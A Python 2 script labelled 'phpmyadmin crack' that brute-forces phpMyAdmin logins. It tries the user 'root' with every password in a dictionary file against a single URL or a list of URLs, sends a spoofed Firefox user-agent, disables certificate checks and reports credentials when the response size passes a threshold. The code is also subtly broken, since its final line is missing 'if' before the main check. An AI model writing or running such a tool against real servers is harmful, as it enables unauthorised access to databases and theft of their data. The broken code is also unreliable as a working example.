#!/usr/bin/env python
#!encoding:utf8
''' phpmyadmin crack'''
import requests
import sys
import optparse

def main():
    parser = optparse.OptionParser('%prog -u <url> -L <urlfile> -f <pass_file> -v ')
    parser.add_option('-u','--url',dest='url',type='string',\
        help='Specify target url')
    parser.add_option('-L', '--urlfile', dest='ufile', type='string',\
        help='Specify url file')

    parser.add_option('-f','--file',dest='passfile',type='string',\
        help='Specify password dict')
    parser.add_option('-v','--verbose',dest='verbose',action='store_true',\
        default=False,help='Show verbosity')
    
    (options,args) = parser.parse_args()

    pass_list = []
    user_list = ['root']

    if options.url == None and options.ufile == None:
        print parser.usage
        exit(1)

    if options.passfile == None:
        options.passfile = 'phpmyadmin.txt'
    with open(options.passfile) as f:
        for p in f.readlines():
            pass_list.append(p.rstrip())

    s = requests.Session()
    header = {'user-agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre'}

    if options.ufile:
        with open(options.ufile,'r') as f:
            for url in f.readlines():
                url = url.rstrip() + '/phpmyadmin'
                try:
                    for user in user_list:
                        for pswd in pass_list:
                            data = {'pma_username':user, 'pma_password':pswd}
                            try:
                                r = s.post(url,headers=header,data=data,verify=False)
                            except:
                                break
                            if options.verbose:
                                print "[*]Cracking --> {0}  {1}".format(user,pswd)
                            if len(r.content) > 13000:
                                print "[+]url:" + url
                                print "[+]username:{0} password:{1}".format(user,pswd)
                                exit(1)
                except:
                    pass
    else:
            for user in user_list:
                for pswd in pass_list:
                    data = {'pma_username':user, 'pma_password':pswd}
                    r = s.post(options.url,headers=header,data=data,verify=False)
                    if options.verbose:
                        print "[*]Cracking --> {0}  {1}".format(user,pswd)
                    if len(r.content) > 20000:
                        print "[+]Found it"
                        print "[+]username:{0} password:{1}".format(user,pswd)
                        exit(1)

__name__ == '__main__':
    main()
